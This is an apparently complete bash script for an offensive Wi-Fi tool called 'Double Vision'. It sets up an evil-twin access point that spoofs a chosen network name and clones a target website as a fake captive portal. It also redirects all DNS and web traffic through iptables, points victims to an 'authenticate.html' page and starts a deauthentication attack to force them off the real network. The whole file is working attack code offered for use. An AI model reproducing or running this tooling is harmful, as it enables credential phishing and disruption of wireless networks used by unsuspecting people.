#!/bin/bash
cat << "EOF"
  __ _ ___ ___ _   _ _ __ ___   ___      | |__  _ __ ___  __ _  ___| |__  
 / _` / __/ __| | | | '_ ` _ \ / _ \_____| '_ \| '__/ _ \/ _` |/ __| '_ \ 
| (_| \__ \__ \ |_| | | | | | |  __/_____| |_) | | |  __/ (_| | (__| | | |
 \__,_|___/___/\__,_|_| |_| |_|\___|     |_.__/|_|  \___|\__,_|\___|_| |_|

                            **Double Vision**

             A Wifi Hacking Tool For Evil Twin Captive Portals

                           Use At Your Own Risk


 
EOF
echo "Which interface do you want to use as your AP NIC? Example: wlan1"
echo ""
read AP
echo""
echo "Using $AP as your AP interface"
echo ""
sleep 1
echo "What is the Wifi network you want to spoof? Example: Starbucks Wifi"
echo ""
read SSID
echo ""
echo "Using $SSID as your spoofed network"
sleep 1
echo ""
echo "Enter Website URL To Clone. Example: https://starbucks.com"
echo ""
read URL
echo ""
echo "Cloning $URL"
systemctl stop dnsmasq
cp Resources/hostapd.conf .
sed -i s/AP/$AP/g hostapd.conf
sed -i s/SSID/$SSID/g hostapd.conf
rm /etc/hostapd/hostapd.conf
cp hostapd.conf /etc/hostapd/hostapd.conf
#rm /var/www/html/index.html
runuser -u pi -- ./SingleFile/cli/single-file $URL --browser-executable-path=/usr/bin/chromium-browser /home/pi/index.html 
mv /home/pi/index.html /var/www/html/index.html
service apache2 start
sleep 1
ifconfig wlan2 down
macchanger -A wlan2
sleep 1 
ifconfig wlan2 up
sleep 1
systemctl start dnsmasq
hostapd -B /etc/hostapd/hostapd.conf
sleep 2
ifconfig br0 up
sleep 2
ifconfig br0 10.1.1.1 netmask 255.255.255.0
sysctl net.ipv4.ip_forward=1
echo "<meta http-equiv="refresh" content=2;URL='http://10.1.1.1/authenticate.html'>">> /var/www/html/index.html
iptables --flush
iptables -t nat --flush
iptables -t nat -A PREROUTING -i br0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53
iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80
iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.1.1.1:443
iptables -t nat -A POSTROUTING -j MASQUERADE
sleep 2
service dnsmasq start
sleep 4
echo "AP Should Be Up. Time To Deauth"
echo ""
sleep 2
echo "Press CTRL+B then press D to disconnect TMUX Session Once Deauth Is Started"
echo ""
tmux new-session -s deauth 'cd PwrDeauther &&  bash PwrDeauther.sh'

